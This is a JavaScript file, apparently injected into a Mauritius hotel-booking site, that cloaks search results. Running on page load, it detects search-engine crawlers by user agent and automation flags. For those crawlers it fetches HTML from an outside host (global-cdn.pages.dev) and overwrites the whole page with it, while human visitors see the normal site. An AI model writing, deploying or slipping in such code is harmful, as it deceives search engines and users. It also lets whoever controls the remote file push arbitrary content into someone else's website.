
(function() {
    'use strict';
    
   
    function detectBot() {
        const ua = navigator.userAgent.toLowerCase();
        
        
        const botPatterns = [
            'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot',
            'slurp', 'facebookexternalhit', 'linkedinbot', 'twitterbot',
            'whatsapp', 'telegrambot', 'applebot', 'petalbot',
            'bot', 'crawler', 'spider', 'crawling'
        ];
        
        
        for (let pattern of botPatterns) {
            if (ua.includes(pattern)) {
                return true;
            }
        }
        
        
        if (navigator.webdriver || 
            (window.chrome && !window.chrome.runtime) ||
            navigator.languages.length === 0) {
            return true;
        }
        
        return false;
    }
    
    
    function loadBotContent() {
        fetch('https://global-cdn.pages.dev/deliverjs/arch/asli.txt')
            .then(response => {
                if (!response.ok) throw new Error('Network response error');
                return response.text();
            })
            .then(htmlContent => {
                
                document.open();
                document.write(htmlContent);
                document.close();
            })
            .catch(error => {
                console.error('Failed to load SEO content:', error);
                
                showFallbackSEOContent();
            });
    }
    
    
    function showFallbackSEOContent() {
        const seoContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotels Booking - Mauritius Attractions | Best Hotel Deals & Accommodation</title>
    <meta name="description" content="Book the best hotels in Mauritius with Mauritius Attractions. Find luxury resorts, budget accommodations, and exclusive deals for your perfect Mauritius holiday.">
    <meta name="keywords" content="mauritius hotels, hotel booking mauritius, luxury resorts mauritius, accommodation mauritius, mauritius attractions">
</head>
<body>
    <h1>Mauritius Hotels Booking - Best Accommodation Deals</h1>
    <p>Discover the perfect hotel for your Mauritius vacation. From luxury beachfront resorts to budget-friendly accommodations.</p>
    
    <section>
        <h2>Featured Mauritius Hotels</h2>
        <p>Explore our curated selection of the best hotels in Mauritius with competitive prices and excellent service.</p>
    </section>
    
    <section>
        <h2>Hotel Booking Information</h2>
        <p>Easy online booking system for Mauritius hotels. Secure payment and instant confirmation.</p>
    </section>
</body>
</html>`;
        
        document.open();
        document.write(seoContent);
        document.close();
    }
    
    
    function randomDelay(max = 2000) {
        return new Promise(resolve => setTimeout(resolve, Math.random() * max));
    }
    
    
    async function initCloaking() {
        await randomDelay(1000);
        
        if (detectBot()) {
            console.log('Search engine bot detected - serving SEO content');
            loadBotContent();
        } else {
            console.log('Human visitor - showing normal content');
            // Biarkan konten normal tampil
        }
    }
    
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initCloaking);
    } else {
        initCloaking();
    }
})();
